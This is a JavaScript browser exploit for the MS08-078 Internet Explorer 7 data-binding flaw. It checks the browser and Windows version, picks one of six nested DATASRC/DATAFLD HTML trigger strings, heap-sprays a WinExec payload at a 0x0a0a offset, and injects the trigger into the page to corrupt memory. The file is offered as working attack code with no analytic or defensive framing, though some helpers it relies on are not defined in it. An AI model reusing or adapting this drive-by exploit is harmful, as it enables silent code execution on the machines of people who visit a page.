var major   = "";
var minor   = "";
var arch    = "";
var name    = "";
var version = "";
var today   = new Date;

function ms08_078(htmlElementID){
	var heapCode, heapSize, heapOffset, theVector, theExploit, showMessage, theMessage;

	getVersion();

	if(name == "IExplorer" && version.match(/7.0/)){ heapSize = 512; }
	else { window.location = "about:blank"; }

	/* Choosing which HTML Element should be used. */
	switch(htmlElementID){
		case 1:
			theVector = "<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
			break;
		case 2:
			theVector = "<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></DIV></DIV>";
			break;
		case 3:
			theVector = "<MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><MARQUEE DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></MARQUEE></MARQUEE>";
			break;
		case 4:
			theVector = "<LABEL DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><LABEL DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></LABEL></LABEL>";
			break;
		case 5:
			theVector = "<FIELDSET><LEGEND DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><FIELDSET><LEGEND DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></LEGEND></LEGEND></FIELDSET></FIELDSET>";
			break;
		case 6:
			theVector = "<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></DIV></SPAN>";
			break;
		default:
			theVector = "<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN></SPAN>";
			break;
	}

	switch(major){
		case "2000":
		case "XP":
		case "2003":
		case "VISTA":
			heapOffset = unescape("%u0a0a%u0a0a");
			break;
		case "Linux":
		default:
			window.location = "about:blank";
			CollectGarbage();
			break;
	}

	heapCode = WinExec;
	heapSpray.Spray(heapCode, heapSize, heapOffset);

	theExploit = document.getElementById("replace");
	theExploit.innerHTML = theVector;
}

function sleep(milliSecond){
	var now = new Date();
	var exitTime = now.getTime() + milliSecond;

	while(true){
		now = new Date();
		if(now.getTime() > exitTime) return;
	}
}